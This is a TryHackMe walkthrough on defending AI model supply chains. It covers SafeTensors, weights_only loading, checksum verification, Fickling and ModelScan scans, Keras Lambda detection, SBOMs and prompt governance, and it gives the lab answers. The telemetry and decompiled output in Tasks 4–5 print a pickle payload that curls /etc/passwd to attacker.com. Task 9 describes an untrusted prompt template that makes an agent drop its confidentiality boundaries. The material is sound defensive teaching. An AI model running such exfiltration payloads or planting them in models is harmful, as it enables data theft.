---
icon: link-horizontal
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/69650d18bb3fe8c456972924-1775818799395
coverY: 0
coverHeight: 138
---

# Securing the AI Supply Chain

**Date:** 20.04.2026&#x20;

**Room Category:** Walkthrough&#x20;

**Core Concept:** Building a comprehensive defense architecture (SupplySecLab) to inspect models, audit dependencies, and govern LLM supply chains.

Following the TryTrainMe breach, it became clear that reactive analysis is insufficient. This documentation outlines the construction of a proactive supply chain security testing lab (SupplySecLab). The objective is to close the gaps exploited by malicious serialization, unauthorized architecture changes, dependency confusion, and untrusted prompt templates.

***

## Task 1: Introduction

The previous rooms confirmed multiple breach vectors. This lab environment is designed to prevent recurrence by enforcing strict governance and automated scanning across all AI artifacts.

Question: I'm ready to build my defences.

> **Answer:** No answer needed

***

## Task 2: Safe Serialisation Formats

Python's pickle format is inherently insecure due to the `__reduce__` method, which permits arbitrary code execution upon loading. The first line of defense is migrating away from unrestricted pickle files.

**Defence 1: SafeTensors**&#x20;

<figure><img src="../.gitbook/assets/image (18) (1) (1).png" alt=""><figcaption></figcaption></figure>

SafeTensors, developed by Hugging Face, guarantees no code execution during loading. It uses a JSON header combined with raw binary tensor data, meaning it physically cannot encode executable instructions.

The migration process involves loading the existing model safely and saving it in the new format:

```python
import torch
from safetensors.torch import save_file, load_file

# Step 1: Load the existing pickle model safely
# (weights_only=True restricts what pickle can do; explained in Defence 2 below)
model_weights = torch.load("model.pkl", weights_only=True)

# Step 2: Save as SafeTensors
save_file(model_weights, "model.safetensors")

# Step 3: Load the SafeTensors model (always safe)
safe_weights = load_file("model.safetensors")
```

**Defence 2: PyTorch weights\_only=True**&#x20;

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="188"><figcaption></figcaption></figure>

When using `torch.load()`, PyTorch uses pickle internally. By setting `weights_only=True`, the unpickler is restricted to reconstructing tensor objects only. Instructions attempting to import modules (like `os`) or call system functions are blocked.

```python
import torch

# UNSAFE: pickle can execute any embedded code
model = torch.load("model.pt")

# SAFE: pickle is restricted to tensor reconstruction only
model = torch.load("model.pt", weights_only=True)
```

_Note: Starting with PyTorch 2.6, `weights_only=True` is the default behavior._

**Limitations:** File extensions can be spoofed (CVE-2023-6730). Furthermore, SafeTensors only protects against load-time execution; it cannot stop architecture-level execution (like Keras Lambda layers) running at inference time.

Question: What serialisation format was created by Hugging Face to replace pickle for ML models?

> **Answer:** SafeTensors

Question: What PyTorch parameter prevents code execution when loading pickle-based models?

> **Answer:** weights\_only=True

***

## Task 3: Model Verification and Provenance

Safe formats do not prevent tampering or replacement. Verification is required to ensure the model received is the exact model published by the author.

**SHA-256 Checksum Verification:** Checksums verify file integrity. Comparing downloaded model hashes against an expected list (`checksums.json`) reveals tampering.

```bash
analyst@tryhackme-2204:~$ cat /opt/supply-chain/models/checksums.json
analyst@tryhackme-2204:~$ sha256sum /opt/supply-chain/models/product_recommender.safetensors /opt/supply-chain/models/model_review_v2.pkl /opt/supply-chain/models/product_recommender.pkl
```

**Model Cards & Adapters:** A model card documents training data, limitations, and intended use. Sparse documentation is a red flag. This scrutiny must also apply to LoRA adapters and models that have passed through third-party format conversion services, as these can easily introduce hidden backdoors.

**The Model Acquisition Framework:**

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

1. **Quarantine:** Isolate the downloaded model.
2. **Source verification:** Verify author, organization, and reputation.
3. **Integrity check:** Compute and compare SHA-256 hashes.
4. **Security scan:** Run static analysis and dependency audits.
5. **Approve or reject:** Only promote verified models to production.

Question: What is the first step in the Model Acquisition Framework when a new model is received?

> **Answer:** Quarantine

Question: Examine the checksums on the VM. Which model file does not match its expected hash?

> **Answer:** model\_review\_v2.pkl

***

## Task 4: Behavioural Analysis

Every model load generates a session event stream. A standard, clean load is contained entirely within the file boundary.

**Baseline Telemetry (Clean Load):**

```bash
SESSION START - model_load
MODEL LOAD BEGIN - /models/sentiment_model.pkl (pickle)
FILE ACCESS - /models/sentiment_model.pkl (rb) [normal]
MODEL LOAD COMPLETE - object_type: SentimentModel
SESSION STOP - model_load
```

**Compromised Load Telemetry:**&#x20;

```bash
SESSION START — model_load
MODEL LOAD BEGIN — /models/model_review_v2.pkl (pickle)
FILE ACCESS — /models/model_review_v2.pkl (rb) [normal]
IMPORT — os 
[DANGEROUS]
SYSTEM CALL — os.system("curl http://attacker.com/exfil -d @/etc/passwd") 
[CRITICAL]
SYSTEM CALL — os.system("curl http://attacker.com/exfil -d @/etc/passwd") exit_code=1536 
[CRITICAL]
MODEL LOAD COMPLETE — object_type: int
SESSION STOP — model_load
```

The compromised agent's telemetry reveals an `IMPORT` flagged `[DANGEROUS]`, two `SYSTEM CALL` entries flagged `[CRITICAL]`, and a final object type of `int` instead of a model. The payload attempted to read `/etc/passwd` and exfiltrate data via shell commands before returning an integer.

This telemetry is gathered by running loads in a sandboxed subprocess utilizing `sys.addaudithook()`, which intercepts interpreter-level events before they fully execute.

Question: What object type does the compromised model's telemetry show on load completion, instead of a model?

> **Answer:** int

***

## Task 5: Scanning Models Before Use

Static analysis catches payloads prior to execution.

**Fickling: Static Pickle Analysis** Fickling decompiles pickle bytecode into readable Python without executing the payload.

```bash
analyst@tryhackme-2204:~$ fickling /opt/supply-chain/models/model_review_v2.pkl
```

_Expected output snippet:_

```python
from os import system
_var0 = system('curl [http://attacker.com/exfil](http://attacker.com/exfil) -d @/etc/passwd')
result0 = _var0
```

Using the safety check flag:

```bash
analyst@tryhackme-2204:~$ fickling --check-safety -p /opt/supply-chain/models/model_review_v2.pkl
```

**ModelScan: Multi-Format Model Scanning** ModelScan assigns severity levels (CRITICAL, HIGH, MEDIUM, LOW) to findings across various formats.

```bash
analyst@tryhackme-2204:~$ modelscan -p /opt/supply-chain/models/model_review_v2.pkl
```

_Expected output:_

```bash
--- Summary ---

Total Issues: 1

Total Issues By Severity:

    - LOW: 0
    - MEDIUM: 0
    - HIGH: 0
    - CRITICAL: 1

--- CRITICAL ---

Unsafe operator found:
  - Severity: CRITICAL
  - Description: Use of unsafe operator 'system' from module 'os'
  - Source: /opt/supply-chain/models/model_review_v2.pkl
```

Scanning the clean SafeTensors model confirms no executable code exists:

```bash
analyst@tryhackme-2204:~$ modelscan -p /opt/supply-chain/models/product_recommender.safetensors
```

_Expected output:_

```bash
--- Summary ---

 No issues found! 🎉
```

Question: Which Trail of Bits tool performs static analysis of pickle files?

> **Answer:** Fickling

Question: What severity level does ModelScan assign to an `os.system` call in a model file?

> **Answer:** CRITICAL

***

## Task 6: Architecture-Level Threats

Attackers can embed malicious logic directly into a model's architecture using Keras Lambda layers. This code executes at inference time (during data processing), not load time. Crucially, this logic survives format conversion to SafeTensors.

**Detecting Architecture-Level Threats:** A baseline model inspection typically shows standard layers (InputLayer, Flatten, Dense).

```
SESSION START - model_inspect
MODEL INSPECT BEGIN - /models/image_classifier.h5 (keras_h5) via h5py
LAYER - InputLayer "input_layer" [clean]
LAYER - Flatten "flatten" [clean]
LAYER - Dense "dense" [clean]
LAYER - Dense "dense_1" [clean]
MODEL INSPECT COMPLETE - 4 layers, 0 suspicious
SESSION STOP - model_inspect
```

Reviewing the telemetry for the compromised model reveals 5 layers instead of 4, with the extra Lambda layer flagged as `SUSPICIOUS`.

Question: Open the Telemetry terminal. How many layers does the compromised model's architecture contain?

> **Answer:** 5

***

## Task 7: Architecture Inspection

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Static inspection is necessary to review flagged architecture anomalies. ModelScan includes `H5LambdaDetectScan` specifically for this purpose.

```bash
analyst@tryhackme-2204:~$ modelscan -p /opt/supply-chain/models/image_classifier_v2.h5
```

_Expected output:_

```bash
--- Summary ---

Total Issues: 1

Total Issues By Severity:

    - LOW: 0
    - MEDIUM: 1
    - HIGH: 0
    - CRITICAL: 0

--- Issues by Severity ---

--- MEDIUM ---

Unsafe operator found:
  - Severity: MEDIUM
  - Description: Use of unsafe operator 'Lambda' from module 'Keras'
  - Source: /opt/supply-chain/models/image_classifier_v2.h5
```

The severity is MEDIUM because Lambda layers have legitimate uses and require manual review.

Deeper inspection utilizing `h5py` directly examines the internal structure:

```bash
analyst@tryhackme-2204:~$ python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/models/image_classifier.h5
analyst@tryhackme-2204:~$ python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/models/image_classifier_v2.h5
```

```bash
=== Architecture Inspection: image_classifier_v2.h5 ===

  Total layers: 5

  [OK]      InputLayer           input_layer_1
  [OK]      Flatten              flatten_1
  [OK]      Dense                dense_2
  [OK]      Dense                dense_3
  [WARNING] Lambda               manipulate_output (function: manipulate_output)

  RESULT: 1 layer(s) require review
    - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```

Question: Run inspect\_h5\_model.py on image\_classifier\_v2.h5. What is the name of the suspicious Lambda layer?

> **Answer:** manipulate\_output

***

## Task 8: Dependency Auditing and SBOMs

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dependencies represent a massive attack surface that must be tightly controlled.

**Version Pinning and Lockfiles:** Exact versions must be specified to prevent pulling in unexpected or malicious updates.

```python
# BAD: allows any version
numpy
requests

# BETTER: pins major.minor but allows patches
numpy>=1.24,<1.25
requests>=2.31,<2.32

# BEST: pins exact version
numpy==1.24.3
requests==2.31.0
```

Tools like `pip-compile` and Poetry generate lockfiles containing cryptographic hashes to enforce identical installations across environments.

**pip-audit:** This tool checks dependencies against vulnerability databases.

```bash
analyst@tryhackme-2204:~$ pip-audit -r /opt/supply-chain/project/requirements.txt
```

**Private Package Indices:** To prevent dependency confusion, internal networks should define private registries as the primary index, with public PyPI as a fallback.

```python
# ~/.pip/pip.conf
[global]
index-url = [https://your-private-pypi.company.com/simple/](https://your-private-pypi.company.com/simple/)
extra-index-url = [https://pypi.org/simple/](https://pypi.org/simple/)
```

**SBOM Generation (Syft):** A Software Bill of Materials (SBOM) tracks all components, making it easier to assess exposure to zero-day disclosures. Two main formats exist: SPDX (licensing focus) and CycloneDX (security focus).

Generating a CycloneDX JSON SBOM:

```bash
analyst@tryhackme-2204:~$ syft /opt/supply-chain/project/ --exclude './venv/**' -o cyclonedx-json > /tmp/sbom.json
```

Displaying a tabular summary:

```bash
analyst@tryhackme-2204:~$ syft /opt/supply-chain/project/ --exclude './venv/**' -o table
```

Reviewing the JSON structure:

```bash
analyst@tryhackme-2204:~$ cat /tmp/sbom.json | python3 -m json.tool | less
```

Question: What is the recommended practice for specifying package versions in requirements.txt?

> **Answer:** Version Pinning

Question: What tool scans Python dependencies against known vulnerability databases?

> **Answer:** pip-audit

Question: Which SBOM format is maintained by OWASP and focuses on security?

> **Answer:** CycloneDX

***

## Task 9: API Provider Assessment

API-served models abstract away the file but shift the supply chain risk directly to the provider's infrastructure and the application's configuration.

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Key Defensive Strategies:**

1. **Provider Due Diligence:** Assess data privacy policies, model versioning guarantees, security certifications, and incident response history.
2. **Behaviour Monitoring:** Since checksums are impossible, monitor the output baseline. Sudden shifts in accuracy or latency indicate a silent model update.
3. **System Prompt Governance:** Prompts imported from public repositories are supply chain artifacts. They must be version-controlled, reviewed, and treated as executable configuration.
4. **Sandboxed Evaluation:** Test API models with a fixed prompt battery and adversarial probes before promoting them to production.

**Hands-On Analysis:** Testing Config A (Internal Governance) vs Config B (Untrusted Template Repository) reveals how an upstream prompt change completely alters the agent's behavior and security posture. Config B leaks incorrect timeframes, names an unknown company, and abandons confidentiality boundaries.

Question: What should you establish to detect when an API provider silently updates their model?

> **Answer:** Behavioural Baseline

Question: What type of artefact should be version-controlled and reviewed like code, to prevent untrusted content from altering LLM behaviour?

> **Answer:** System Prompts

Question: What company name does Config B identify as the service provider?

> **Answer:** TryTrainML

***

## Conclusion

SupplySecLab establishes a layered, defense-in-depth approach spanning file inspection, architecture analysis, dependency auditing, and API governance. The methodology relies on constant verification, recognizing that passing a single check (like a checksum) does not guarantee an artifact is safe from other vectors (like architecture manipulation).
